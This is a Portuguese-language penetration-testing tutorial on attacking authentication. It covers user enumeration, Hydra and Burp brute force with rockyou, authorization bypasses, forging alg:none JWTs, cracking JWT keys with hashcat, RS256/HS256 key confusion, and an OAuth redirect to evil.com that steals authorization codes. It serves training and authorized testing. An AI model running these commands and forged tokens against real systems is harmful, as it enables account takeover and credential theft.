# Fase 5: Testes de Autenticação, Sessão, JWT e OAuth

**Tempo estimado:** 60-90 minutos
**Objetivo:** Testar TODO o ciclo de autenticação — enumeração de usuários, brute force, bypass de autorização, ataques a JWT e OAuth.
**Por quê:** Autenticação é a primeira barreira de defesa. Se você pode bypassar login, roubar tokens ou escalar privilégios, todas as outras proteções tornam-se inúteis.

---

## Por que Autenticação é Tão Crítica?

Existem três pilares em qualquer sistema de autenticação:

| Pilar | O que protege | Ataque típico |
|-------|---------------|---------------|
| **Identificação** | Saber QUEM é o usuário | Enumeração (descobrir quem existe) |
| **Autenticação** | Provar QUEM é você | Brute force, credential stuffing |
| **Autorização** | O que o usuário PODE fazer | IDOR, privilege escalation |

Se qualquer um desses pilares falha → o sistema é comprometido.

---

## 5A: Enumeração de Usuários

### Passo 5A.1 — Teste de Mensagens de Erro

**O que você vai fazer:** Verificar se a aplicação revela se um usuário existe ou não através de mensagens de erro diferentes.

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "admin",
  "password": "senha_incorreta_123"
}
```

**✅ Output esperado (VULNERÁVEL a enumeração):**
```
HTTP/1.1 401 Unauthorized
{"error": "User not found"}
```

**O que procurar:** A mensagem "User not found" é diferente de "Invalid credentials". Isso permite confirmar quais usuários existem.

**✅ Output esperado (SEGURO):**
```
HTTP/1.1 401 Unauthorized
{"error": "Invalid credentials"}
```

Mensagem genérica → não revela se o usuário existe.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Mensagem sempre igual | App genérica | Teste timing (Passo 5A.2) |
| Retorna 403 em vez de 401 | Auth via header | Teste com Authorization header |
| Request bloqueado | Rate limiting | Use delay entre requests |

### Passo 5A.2 — Enumeração via Timing

**O que você vai fazer:** Medir o tempo de resposta para usuários existentes vs não existentes. Usuários existentes costumam demorar mais porque o server busca no banco e compara hash da senha.

```bash
for user in admin root administrator test user nonexistentuser123; do
  echo -n "$user: "
  time curl -s -o /dev/null -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"wrong123\"}" 2>&1 | grep real
done
```

**✅ Output esperado (VULNERÁVEL):**
```
admin: 0m0.456s
root: 0m0.423s
administrator: 0m0.467s
test: 0m0.312s
user: 0m0.298s
nonexistentuser123: 0m0.102s
```

**O que procurar:** Usuários existentes (`admin`, `root`) demoram ~400ms. Usuários não existentes (`nonexistentuser123`) demoram ~100ms. A diferença de timing confirma quais usuários existem.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todos demoram igual | App usa tempo constante | Teste enumeração via registro (Passo 5A.3) |
| Rate limit após 3 tentativas | Proteção ativa | Reduza a velocidade: adicione `sleep 1` entre requests |

### Passo 5A.3 — Enumeração via Registration

```http
POST /api/register HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "admin",
  "email": "test@test.com",
  "password": "Test1234!"
}
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 409 Conflict
{"error": "Username already exists"}
```

**O que procurar:** "Username already exists" confirma que o usuário `admin` existe.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna 400 genérico | Validação genérica | Tente mudar email (pode serunique) |
| Não existe rota de registro | App sem self-registration | Fique com enumeração por timing |

---

## 5B: Brute Force

### Passo 5B.1 — Brute Force com Hydra

**O que você vai fazer:** Testar senhas comuns contra o login usando força bruta automatizada. O Hydra tenta cada senha da wordlist e compara a resposta — se a resposta for diferente do "login falhou" padrão, ele sabe que acertou.

**Passo 5B.1.1 — Instalar Hydra:**
```bash
sudo apt install hydra -y
```

**Verificar instalação:**
```bash
hydra -V
```

**✅ Output esperado:**
```
Hydra v9.x (...)
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `hydra: command not found` | Não instalado | `sudo apt install hydra -y` |
| Erro de dependências | Repositório desatualizado | `sudo apt update && sudo apt install hydra -y` |

**Passo 5B.1.2 — Configurar brute force:**

Antes de rodar o Hydra, você precisa criar um arquivo com a mensagem de erro de login falhou. No Burp Repeater, envie um login errado e anote a mensagem exata da resposta.

```bash
# Criar arquivo com mensagem de erro (copie do Burp)
echo "Invalid credentials" > /tmp/login-fail.txt
```

**Passo 5B.1.3 — Executar Hydra:**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  https-post-form "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Explicação das flags:**
| Flag | Função |
|------|--------|
| `-l admin` | Username fixo para testar |
| `-P /usr/share/wordlists/rockyou.txt` | Arquivo de senhas para testar |
| `https-post-form` | Tipo de request (POST via HTTPS) |
| `/api/login` | Endpoint de login |
| `username=^USER^&password=^PASS^` | Corpo do request com placeholders |
| `:Invalid credentials` | Mensagem de erro que indica FALHA (para filtrar) |

**⚠️ IMPORTANTE:** O campo `:Invalid credentials` DEVE ser a mensagem EXATA que o server retorna quando o login falha. Se colocar uma mensagem diferente, o Hydra vai marcar TODAS as tentativas como falha.

**✅ Output esperado (encontrando senha):**
```
[80][https-post-form] host: target.com   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
```

**✅ Output esperado (senha não encontrada):**
```
0 of 1 target completed, 0 valid password found
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| 0 matches encontrados | Mensagem de erro incorreta | Verifique a mensagem exata no Burp |
| Hydra trava em 0% | TLS error | Adicione `-f` para parar no primeiro hit |
| Rate limiting | WAF bloqueando | Adicione delay: `-w 5` (5 segundos entre tentativas) |
| Muito lento | Wordlist muito grande | Use wordlist menor: `/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt` |

**Passo 5B.1.4 — Brute force com múltiplos usuários:**

```bash
# Criar arquivo de usuários
echo -e "admin\nroot\nadministrator\ntest\nuser" > /tmp/users.txt

# Rodar com múltiplos usuários
hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt target.com \
  https-post-form "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**⚠️ ATENÇÃO:** Múltiplos usuários torna o ataque MUITO mais lento. Use apenas quando a enumeração de usuários não funcionar.

### Passo 5B.2 — Brute Force com Burp Intruder

1. No Burp Repeater, envie request de login
2. Clique direito → **Send to Intruder**
3. Na aba **Positions**: clique **Clear §**, posicione cursor no campo senha, clique **Add §**
4. Na aba **Payloads**: Type = **Simple list**, Load = `/usr/share/wordlists/rockyou.txt`
5. Clique **Start attack**
6. **Analise:** filtre por tamanho de response diferente (response maior = login bem-sucedido)

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todas responses têm mesmo tamanho | Resposta é constante | Filtre por código HTTP ou conteúdo específico |
| Intruder muito lento | Sequencial | Use Turbo Intruder (extensão) |

---

## 5C: Bypass de Autenticação

### Passo 5C.1 — Bypass de Authorization

**O que você vai fazer:** Testar se endpoints protegidos aceitam requests sem autenticação ou com tokens inválidos.

```http
# Sem autenticação
GET /api/admin/users HTTP/1.1
Host: target.com

# Com token inválido
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer invalid_token_aqui

# Com token de outro usuário (IDOR)
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer token_do_usuario_comum
```

**O que procurar:**
- **Sem auth retornou 200 OK** → Sem autorização no endpoint
- **Token inválido retornou 200 OK** → Validação de token não funciona
- **Token de user comum em rota admin retornou 200 OK** → Falta de verificação de role

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todos retornam 401/403 | Auth robusta | Tente bypass via path traversal |
| Token válido necessário | JWT bem implementado | Foque em ataques JWT (seção 5D) |

### Passo 5C.2 — Bypass via HTTP Method

```http
PUT /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer token_invalido

DELETE /api/admin/users/1 HTTP/1.1
Host: target.com
Authorization: Bearer token_invalido
```

**Por que funciona:** Algumas aplicações bloqueiam GET/POST mas esquecem de bloquear PUT/DELETE/PATCH.

### Passo 5C.3 — Bypass via Path Traversal

```http
GET /api/../admin/users HTTP/1.1
Host: target.com

GET /api/admin/users HTTP/1.1
Host: target.com
X-Original-URL: /api/admin/users

GET /api/admin/users HTTP/1.1
Host: target.com
X-Rewrite-URL: /api/admin/users
```

**Por que funciona:** O servidor pode validar a URL original mas não a URL após normalização. `../` faz o path subir um diretório, e headers `X-Original-URL`/`X-Rewrite-URL` podem redirecionar o server para um path diferente.

---

## 5D: JWT Attacks

### Passo 5D.1 — O que é JWT?

JWT (JSON Web Token) é um padrão de autenticação com 3 partes separadas por `.`, codificadas em Base64:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ.abc123signature
│                                     │                                    │
└─ Header (alg, typ)                 └─ Payload (dados do user)           └─ Assinatura
```

**⚠️ CRÍTICO:** O payload de um JWT NÃO é criptografado — é apenas Base64. Qualquer pessoa pode ler. A segurança está na ASSINATURA (que valida a integridade).

### Passo 5D.2 — Decodificar JWT

**O que você vai fazer:** Decodificar cada parte do JWT para entender o que está dentro e identificar vulnerabilidades.

```bash
# JWT de exemplo: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ.abc123

# Decodificar HEADER (primeira parte)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null
```

**✅ Output esperado:**
```json
{"alg":"HS256","typ":"JWT"}
```

**O que procurar:** O campo `alg` diz qual algoritmo é usado:
- `HS256` → HMAC com chave secreta (vulnerável a brute force)
- `RS256` → RSA (vulnerável a key injection se servidor aceitar HS256)
- `none` → **SEM ASSINATURA (vulnerável a bypass completo)**

```bash
# Decodificar PAYLOAD (segunda parte)
echo "eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ" | base64 -d 2>/dev/null
```

**✅ Output esperado:**
```json
{"username":"admin","role":"user"}
```

**O que procurar:**
- `role` pode ser alterado para `admin`
- `user_id` pode ser trocado para outro (IDOR via JWT)
- `exp` (expiration) pode ser removido ou alterado

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Base64 com `-` e `_` | URL-safe Base64 | Use `base64 -d <<< "eyJ..."` |
| Output com lixo | Padding incorreto | Adicione `=` no final até funcionar |
| Não encontra JWT | Token em outro header | Verifique: Cookie, Authorization, X-Auth-Token |

### Passo 5D.3 — Usar jwt_tool (mais completo)

```bash
# Instalar jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip install -r requirements.txt
```

```bash
# Decodificar JWT
python3 jwt_tool.py <JWT_TOKEN> -T

# Output mostra header, payload e assinatura decodificados
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `jwt_tool: command not found` | Não instalado | `git clone https://github.com/ticarpi/jwt_tool.git` |
| `ModuleNotFoundError` | Dependências faltando | `pip install -r requirements.txt` |

### Passo 5D.4 — JWT Algorithm None (ataque mais poderoso)

**O que você vai fazer:** Modificar o header do JWT para usar algoritmo `none` (sem assinatura). Se o servidor aceitar → bypass completo de autenticação.

```bash
# 1. Decodificar header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

# 2. Criar novo header: {"alg":"none","typ":"JWT"}
# 3. Encodificar em Base64
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# 4. Criar novo payload: {"username":"admin","role":"admin"}
# 5. Encodificar em Base64
echo -n '{"username":"admin","role":"admin"}' | base64 | tr -d '='
# Output: eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0

# 6. Montar JWT: header.payload. (sem assinatura)
# 7. Enviar request com o JWT modificado
```

**Como enviar no Burp:**
```http
GET /api/admin HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"users": [...]}
```

**✅ Output esperado (NÃO vulnerável):**
```
HTTP/1.1 401 Unauthorized
{"error": "Invalid token"}
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Server retorna 401 | Server valida assinatura | Tente brute force de chave (Passo 5D.5) |
| Server retorna 400 | Formato inválido | Verifique se tem `.` no final e padding correto |

### Passo 5D.5 — JWT Weak Key (Brute Force de Chave)

**O que você vai fazer:** Se o JWT usa HMAC (HS256/HS384/HS512), tentar crackear a chave secreta usando wordlists.

```bash
# Criar arquivo com o JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ" > /tmp/jwt.txt

# Crackear com hashcat (GPU acelerado)
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
```

**Explicação:**
| Parâmetro | Função |
|-----------|--------|
| `-m 16500` | Tipo de hash: JWT HMAC |
| `/tmp/jwt.txt` | Arquivo com o JWT |
| `/usr/share/wordlists/rockyou.txt` | Wordlist de senhas |

**✅ Output esperado (chave encontrada):**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ:secret123
```

**O que procurar:** A chave encontrada (no exemplo: `secret123`). Com essa chave, você pode assinar JWTs arbitrários.

```bash
# Se preferir brute force com jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| hashcat não suporta `-m 16500` | Versão antiga | `sudo apt update && sudo apt install hashcat -y` |
| Chave não encontrada | Senha não está na wordlist | Tente wordlists maiores ou foco em outro vetor |
| CPU lento com jwt_tool | Sem GPU | Use `hashcat` (GPU) ou teste no HTB Academy |

### Passo 5D.6 — JWT Key Injection

**Se o servidor usa RS256 (chave pública/privada), tentar mudar para HS256 e usar a chave pública como HMAC secret.**

```bash
# 1. Extrair chave pública do JWKS (endpoint /.well-known/jwks.json)
curl -s https://target.com/.well-known/jwks.json | python3 -m json.tool

# 2. Copiar o valor de "n" (módulo RSA)
# 3. Criar JWT com alg:HS256 e assinar com a chave pública

python3 jwt_tool.py <JWT_TOKEN> -X k
# jwt_tool vai tentar key injection automaticamente
```

**Por que funciona:** Alguns servidores misturam validação — usam RS256 para verificar mas aceitam HS256 para validar, e usam a MESMA chave para ambos (o que é incorreto).

---

## 5E: OAuth Attacks

### Passo 5E.1 — Redirect URI Bypass

**O que você vai fazer:** Verificar se o servidor aceita redirect URIs não registrados, permitindo roubo de tokens.

```http
GET /oauth/authorize?client_id=abc123&redirect_uri=https://evil.com/callback HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 302 Found
Location: https://evil.com/callback?code=abc123def456
```

**Se aceitar redirect_uri não registrado → VULNERÁVEL.** O código de autorização vai para o servidor do atacante.

**✅ Output esperado (SEGURO):**
```
HTTP/1.1 400 Bad Request
{"error": "invalid_redirect_uri"}
```

### Passo 5E.2 — State Parameter CSRF

```http
GET /oauth/authorize?client_id=abc123&redirect_uri=https://target.com/callback HTTP/1.1
Host: target.com
```

**Se state não é obrigatório → VULNERÁVEL a CSRF no fluxo OAuth.** O atacante pode forçar o usuário a vincular a conta do atacante.

---

## Checklist de Autenticação

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | Enumeração de usuários testada | `relatorio/user-enumeration.txt` | [ ] |
| 2 | Brute force executado | `relatorio/brute-force.txt` | [ ] |
| 3 | Bypass de authorization testado | `relatorio/auth-bypass.txt` | [ ] |
| 4 | Bypass via HTTP method testado | `relatorio/method-bypass.txt` | [ ] |
| 5 | Bypass via path traversal testado | `relatorio/path-bypass.txt` | [ ] |
| 6 | JWT analisado | `relatorio/jwt-analysis.txt` | [ ] |
| 7 | JWT alg:none testado | `relatorio/jwt-alg-none.txt` | [ ] |
| 8 | JWT weak key testado | `relatorio/jwt-crack.txt` | [ ] |
| 9 | OAuth testado | `relatorio/oauth.txt` | [ ] |

### ✅ Sinal de sucesso:
- Pelo menos **uma vulnerabilidade de autenticação confirmada**
- **Credenciais comprometidas** ou bypass documentado
- **JWT ou OAuth vulnerability** explorada

### ❌ Se falhou:
- Auth pode ser bem implementada → tente timing attacks e enumeração via registration
- JWT pode usar algoritmo forte → tente weak key com hashcat
- O mínimo para avançar: ter testado pelo menos enumeração + brute force + bypass básico

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 5 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `user-enumeration.txt` | Fase 6, 7 | Saber quais usuários testar |
| `brute-force.txt` | Fase 11 (Validação) | Confirmar credenciais comprometidas |
| `auth-bypass.txt` | Fase 12 (Relatório) | Documentar bypass de autorização |
| `jwt-analysis.txt` | Fase 12 (Relatório) | Documentar vulnerabilidades JWT |

**Se completou tudo → Avance para Fase 6** (`06-ssrf.md`)

---

## Mini-Checkpoint: Resolva um Lab de Auth

1. Acesse o lab "Username enumeration via subtly different responses" no PortSwigger: https://portswigger.net/web-security/authentication/username-enumeration/lab-subtly-different-responses
2. Use Burp Repeater para comparar responses de usuários existentes e não existentes
3. Identifique a diferença sutil nas respostas
4. Enumere todos os usuários e tente brute force

Se conseguiu → avance. Se não → revise a seção 5A e tente timing attacks.
